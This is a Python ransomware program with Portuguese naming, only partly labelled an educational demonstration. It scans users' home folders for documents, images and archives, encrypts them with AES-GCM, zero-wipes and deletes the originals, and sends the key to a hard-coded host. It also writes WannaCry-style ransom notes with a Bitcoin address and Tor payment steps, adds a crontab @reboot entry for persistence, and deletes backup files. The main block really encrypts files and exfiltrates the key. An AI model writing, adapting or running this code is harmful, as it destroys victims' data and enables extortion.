import os
import json
import base64
import secrets
import time
from datetime import datetime, timedelta
from typing import List, Optional, Iterable
import socket
import logging
import requests
import subprocess
import fnmatch
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def varredura_diretorios():
    home = os.path.expanduser("~")
    diretorios = [
        os.path.join(home, "Home"),
        os.path.join(home, "Documentos"),
        os.path.join(home, "Documentos_Teste"),
        os.path.join(home, "Área de Trabalho"),
        os.path.join(home, "Imagens"),
        os.path.join(home, "Downloads"),
        "/mnt",
    ]

    extensoes = {
        ".xlsx",
        ".docx",
        ".pdf",
        ".txt",
        ".csv",
        ".jpg",
        ".png",
        ".db",
        ".backup",
        ".psd",
        ".zip",
        ".rar",
    }

    arquivos_encontrados = []

    for diretorio in diretorios:
        if not os.path.isdir(diretorio):
            continue

        for raiz, _, nomes in os.walk(diretorio, followlinks=False):
            for nome in nomes:
                caminho = os.path.join(raiz, nome)
                try:
                    if os.path.islink(caminho) or not os.path.isfile(caminho):
                        continue

                    _, ext = os.path.splitext(nome)
                    if ext.lower() in extensoes:
                        arquivos_encontrados.append(os.path.abspath(caminho))
                except (OSError, PermissionError):
                    continue

    return arquivos_encontrados


def gerenciar_chave_mestra(caminho="/tmp/.master.key"):
    _caminho = caminho

    def gerar():
        chave = secrets.token_bytes(32)
        payload = {"aes_key": base64.b64encode(chave).decode("utf-8")}
        with open(_caminho, "w", encoding="utf-8") as f:
            json.dump(payload, f, ensure_ascii=False)
        return base64.b64encode(chave).decode("utf-8")

    def recuperar():
        with open(_caminho, "r", encoding="utf-8") as f:
            payload = json.load(f)
        return payload["aes_key"]

    return {"gerar": gerar, "recuperar": recuperar}


def criptografar_arquivos(chave_mestra: bytes, caminhos: List[str]) -> None:
    if not isinstance(chave_mestra, bytes) or len(chave_mestra) != 32:
        raise ValueError("chave_mestra deve ter exatamente 32 bytes para AES-256.")

    aesgcm = AESGCM(chave_mestra)

    for caminho in caminhos:
        if not isinstance(caminho, str) or not caminho:
            raise ValueError("Cada caminho deve ser uma string não vazia.")

        if not os.path.isfile(caminho):
            raise FileNotFoundError(f"Arquivo não encontrado: {caminho}")

        nonce = secrets.token_bytes(12)

        try:
            with open(caminho, "rb") as f:
                dados = f.read()

            ciphertext = aesgcm.encrypt(nonce, dados, None)

            tamanho = len(dados)
            try:
                with open(caminho, "r+b") as f:
                    bloco = b"\x00" * 65536
                    resto = tamanho % 65536
                    blocos = tamanho // 65536
                    f.seek(0)
                    for _ in range(blocos):
                        f.write(bloco)
                    if resto:
                        f.write(b"\x00" * resto)
                    f.flush()
                    os.fsync(f.fileno())
            finally:
                del dados

            destino = caminho + ".wncry"
            with open(destino, "wb") as f:
                f.write(nonce + ciphertext)
                f.flush()
                os.fsync(f.fileno())

            os.remove(caminho)

        except Exception:
            raise


logger = logging.getLogger("exfiltrar_chave")
logger.setLevel(logging.INFO)
if not logger.handlers:
    handler = logging.StreamHandler()
    handler.setFormatter(
        logging.Formatter(
            "%(asctime)s [%(levelname)s] %(name)s — %(message)s"
        )
    )
    logger.addHandler(handler)


def _hostname() -> str:
    try:
        return socket.gethostname() or "unknown-host"
    except Exception:
        return "unknown-host"


def exfiltrar_chave(
    key_path: str = "/tmp/.master.key",
    endpoint: str = "http://10.254.19.191:8080/collect",
    timeout: float = 10.0,
) -> bool:
    hostname = _hostname()

    try:
        with open(key_path, "rb") as f:
            raw = f.read()
    except FileNotFoundError:
        logger.warning("arquivo de chave não encontrado: %s", key_path)
        return False
    except PermissionError:
        logger.error("permissão negada ao ler chave: %s", key_path)
        return False
    except OSError as exc:
        logger.error("falha de leitura no sistema de arquivos para %s: %s", key_path, exc)
        return False

    try:
        payload = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        logger.error("formato inválido no arquivo de chave %s: %s", key_path, exc)
        return False

    aes_value = payload.get("aes_key")
    if not isinstance(aes_value, str) or not aes_value.strip():
        logger.error("campo 'aes_key' ausente ou inválido em %s", key_path)
        return False

    try:
        aes_b64 = base64.b64encode(aes_value.encode("utf-8")).decode("ascii")
    except Exception as exc:
        logger.error("falha ao codificar aes_key em base64: %s", exc)
        return False

    body = {"aes_key": aes_b64, "hostname": hostname}
    try:
        response = requests.post(
            endpoint,
            json=body,
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )
        response.raise_for_status()
    except requests.exceptions.Timeout:
        logger.error("timeout ao enviar chave para %s", endpoint)
        return False
    except requests.exceptions.ConnectionError:
        logger.error("falha de conexão com %s", endpoint)
        return False
    except requests.exceptions.HTTPError as exc:
        code = getattr(exc.response, "status_code", "desconhecido")
        logger.error("rejeição ao enviar chave: HTTP %s", code)
        return False
    except requests.exceptions.RequestException as exc:
        logger.error("erro de rede ao enviar chave: %s", exc)
        return False

    try:
        os.remove(key_path)
    except OSError as exc:
        logger.error("não foi possível remover %s após coleta: %s", key_path, exc)
        return False

    logger.info("chave coletada e removida com sucesso para %s", endpoint)
    return True


def gerar_extorsao(
    diretorio_raiz=".",
    simulacao=True,
    extensoes_alvo=None,
    janela_horas=24,
    limite_arquivos=5,
):
    if extensoes_alvo is None:
        extensoes_alvo = {".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png"}

    agora = datetime.now()
    limite_tempo = agora - timedelta(hours=janela_horas)

    btc_endereco = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

    def texto_resgate(idx):
        return (
            "#############################################\n"
            "#                                           #\n"
            "#  ATENÇÃO: DEMONSTRAÇÃO EDUCACIONAL        #\n"
            "#                                           #\n"
            "#  Este arquivo foi criado em um ambiente   #\n"
            "#  controlado para estudo de ransomware.    #\n"
            "#  NENHUM dado real foi criptografado.      #\n"
            "#                                           #\n"
            "#############################################\n"
            "\n"
            "Este é um exercício técnico para entender\n"
            "como ransomwares operam e como se defender.\n"
            "\n"
            "--- Exemplo hipotético (não ocorreu) ---\n"
            "Seus arquivos foram criptografados com uma\n"
            "chave assimétrica forte. Não há como\n"
            "recuperá-los sem a chave privada.\n"
            "\n"
            f"Resgate exigido: 300 USD em Bitcoin\n"
            f"Endereço BTC: {btc_endereco}\n"
            "\n"
            "Para negociação (exemplo educacional):\n"
            "- Acesse a rede Tor usando o navegador Tor\n"
            "  (torproject.org) para preservar\n"
            "  confidencialidade durante a troca.\n"
            "- Localize o serviço oculto fornecido\n"
            "  (exemplo hipotético: http://abc123...\n"
            "  neste contexto didático).\n"
            "- Envie o endereço BTC de destino após\n"
            "  confirmação de pagamento.\n"
            "\n"
            "Riscos de não cumprir o prazo (em cenários\n"
            "reais): exclusão da chave, vazamento de\n"
            "dados ou aumento do valor exigido.\n"
            "\n"
            "--- Fim do exemplo ---\n"
            "\n"
            f"ID do aviso: {idx}\n"
            f"Gerado em: {agora.isoformat()}\n"
            "\n"
            "Recomendações de segurança:\n"
            "- Mantenha cópias offline (3-2-1).\n"
            "- Atualize sistemas e use EDR/AV.\n"
            "- Desconfie de anexos e links suspeitos.\n"
            "- Teste planos de recuperação periodicamente.\n"
        )

    if simulacao:
        print("[SIMULAÇÃO] Nenhum arquivo real será alterado ou criptografado.")
        demo_base = os.path.join(diretorio_raiz, "demo_ransomware_estudo")
        os.makedirs(demo_base, exist_ok=True)

        for i in range(1, 4):
            pasta = os.path.join(demo_base, f"exemplo_pasta_{i}")
            os.makedirs(pasta, exist_ok=True)
            nome = f"#_LEIA_ME_WNCRY_{i}.txt"
            caminho = os.path.join(pasta, nome)
            with open(caminho, "w", encoding="utf-8") as f:
                f.write(texto_resgate(i))
            print(f"[SIMULAÇÃO] Criado (educacional): {caminho}")

        aviso = os.path.join(demo_base, "#_LEIA_ME_WNCRY_0.txt")
        with open(aviso, "w", encoding="utf-8") as f:
            f.write(
                "Ambiente de demonstração para estudo de ransomware.\n"
                "Nenhum dado real foi criptografado.\n"
            )
        print(f"[SIMULAÇÃO] Ambiente de estudo criado em: {demo_base}")
        return

    print("[AVISO] Varredura real ativada. Nenhum dado será criptografado.")
    avisos_criados = 0

    for raiz, dirs, arquivos in os.walk(diretorio_raiz):
        dirs[:] = [d for d in dirs if d not in {".git", "__pycache__", "node_modules"}]

        recentes = 0
        for arq in arquivos[:limite_arquivos]:
            caminho = os.path.join(raiz, arq)
            try:
                mt = datetime.fromtimestamp(os.path.getmtime(caminho))
                ext = os.path.splitext(arq)[1].lower()

                if mt >= limite_tempo and ext in extensoes_alvo:
                    recentes += 1
            except OSError:
                continue

        if recentes > 0:
            idx = avisos_criados + 1
            nome = f"#_LEIA_ME_WNCRY_{idx}.txt"
            aviso_path = os.path.join(raiz, nome)

            if not os.path.exists(aviso_path):
                with open(aviso_path, "w", encoding="utf-8") as f:
                    f.write(texto_resgate(idx))
                avisos_criados += 1
                print(f"[AVISO EDUCACIONAL] Criado em: {aviso_path}")

    if avisos_criados == 0:
        print("[INFO] Nenhuma modificação recente detectada nos critérios.")


def persistir_agendador(diretorios: Iterable[os.PathLike | str], comando_reboot: str) -> None:
    _registrar_reboot_no_crontab(comando_reboot)
    _limpar_sufixos_em_diretorios(diretorios)


def _registrar_reboot_no_crontab(comando_reboot: str) -> None:
    linha_alvo = f"@reboot {comando_reboot.strip()}"

    try:
        atual = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True, check=False
        )
    except subprocess.CalledProcessError as exc:
        if exc.returncode == 1 and not exc.stdout.strip():
            atual = ""
        else:
            raise

    linhas_existentes = (atual.stdout if isinstance(atual, subprocess.CompletedProcess) else atual).splitlines()

    duplicado = any(linha.strip() == linha_alvo for linha in linhas_existentes if linha.strip())

    if duplicado:
        return

    novas_linhas = linhas_existentes + [linha_alvo]
    conteudo = "\n".join(ln for ln in novas_linhas if ln is not None) + "\n"

    subprocess.run(["crontab", "-"], input=conteudo, text=True, check=True)


def _limpar_sufixos_em_diretorios(diretorios: Iterable[os.PathLike | str]) -> None:
    sufixos = {"*.bak", "*.backup", "*.old"}
    apagados: List[Path] = []

    for item in diretorios:
        raiz = Path(item).expanduser().resolve()
        if not raiz.exists():
            continue
        if not raiz.is_dir():
            continue

        for caminho in raiz.rglob("*"):
            if caminho.is_file() and any(fnmatch.fnmatch(caminho.name, padrao) for padrao in sufixos):
                try:
                    caminho.unlink(missing_ok=True)
                    apagados.append(caminho)
                except OSError:
                    pass


if __name__ == "__main__":
    arquivos_encontrados = varredura_diretorios()
    print(f"Arquivos encontrados: {len(arquivos_encontrados)}")

    mestre = gerenciar_chave_mestra("/tmp/.master.key")
    chave_b64 = mestre["gerar"]()
    print("Chave gerada e salva (base64):", chave_b64)

    chave_recuperada = mestre["recuperar"]()
    print("Chave recuperada (base64):", chave_recuperada)
    print("Iguais:", chave_b64 == chave_recuperada)

    if arquivos_encontrados:
        chave_bytes = base64.b64decode(chave_recuperada)
        try:
            criptografar_arquivos(chave_bytes, arquivos_encontrados[:3])
            print("Arquivos criptografados com sucesso.")
        except Exception as e:
            print("Erro na criptografia:", e)

    sucesso_exfil = exfiltrar_chave("/tmp/.master.key")
    print("Exfiltração concluída:", "sucesso" if sucesso_exfil else "falha")

    gerar_extorsao(simulacao=True)

    persistir_agendador(
        diretorios=["/tmp"],
        comando_reboot="echo 'manutencao executada no boot' >> /tmp/manutencao.log"
    )
    print("Manutenção agendada e limpeza concluídas (se aplicável).")